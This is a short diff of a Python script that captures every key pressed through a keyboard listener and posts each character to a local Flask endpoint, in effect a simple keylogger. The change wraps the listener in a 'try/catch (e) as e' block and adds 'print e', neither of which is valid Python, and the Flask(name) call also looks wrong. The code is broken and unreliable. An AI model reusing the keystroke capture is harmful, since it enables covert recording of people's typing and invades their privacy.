@@ -4,7 +4,7 @@ import logging
 
 app = Flask(name)
 
-log_dir = ""
+
 
 def on_press(key):
     character = str(key)
@@ -12,7 +12,11 @@ def on_press(key):
     requests.post('http://localhost:5000/keypress', data={'character': character})
 
 # Set up the listener
-listener = keyboard.Listener(on_press=on_press)
+try:
+    listener = keyboard.Listener(on_press=on_press)
+catch (e) as e:
+    print e
+
 
 @app.route('/keypress', methods=['POST'])
 def keypress():
